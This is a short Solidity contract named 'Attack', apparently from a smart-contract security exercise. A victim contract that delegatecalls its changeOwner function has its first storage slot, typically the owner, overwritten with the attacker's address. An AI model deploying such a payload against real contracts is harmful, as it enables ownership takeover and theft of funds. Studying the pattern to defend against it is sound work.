// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

contract Attack {
    address public immutable hacker;

    address public owner;

    constructor() {
        hacker = msg.sender;
    }

    function changeOwner() external {
        owner = hacker;
    }
}